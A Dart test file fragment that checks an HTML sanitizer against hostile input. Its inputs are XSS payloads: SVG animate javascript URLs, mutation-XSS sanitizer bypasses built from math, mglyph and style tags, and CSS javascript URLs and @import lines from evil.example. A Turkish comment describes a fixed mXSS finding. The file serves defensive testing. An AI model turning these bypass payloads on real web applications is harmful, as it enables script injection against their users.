    test('SVG <animate> via xlink:href / from-to', () {
      neutralised(
        '<svg><a><animate attributeName="xlink:href" from="x" to="javascript:alert(1)"/><text>x</text></a></svg>',
      );
    });

    // Fixed (was: YÜKSEK (sanitizer): mutation XSS. html paketi MathML/SVG ad alanını tarayıcıdan farklı
    // ayrıştırıyor; <style> içeriği ham metin sayılıp serileştiriliyor, tarayıcı yeniden ayrıştırınca içindeki
    // <img onerror=…> canlı öğeye dönüşüyor (DOMPurify tarzı bypass). JS kapalı + CSP ile bugün sömürülemez; çıktı
    // yine de "on*/ağ içeriği kalmamalı" garantisini bozuyor.)
    test('mXSS: <math><mtext><table><mglyph><style><!--', () {
      neutralised(
        '<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;/mglyph&gt;&lt;img src=1 onerror=alert(1)&gt;">',
      );
    });
    test('mXSS: <svg></p><style><a id="', () {
      neutralised('<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">');
    });
    test('mXSS: <form><math><mtext></form><form><mglyph><style>', () {
      neutralised('<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>');
    });

    test(
      'style="…url(javascript:/remote)" and <style>@import are passed through',
      () {
        neutralised('<div style="background:url(javascript:alert(1))">x</div>');
        neutralised(
          '<style>@import url(https://evil.example/a.css);</style><div style="background:url(https://evil.example/p.png)">x</div>',
        );
      }
    );

    test(
      'hostile deep nesting must not freeze the UI isolate',
      () {
        final sw = Stopwatch()..start();
        safePreviewDocument('<div>' * 20000);
        expect(sw.elapsedMilliseconds, lessThan(5000));
      }
    );
  });
}
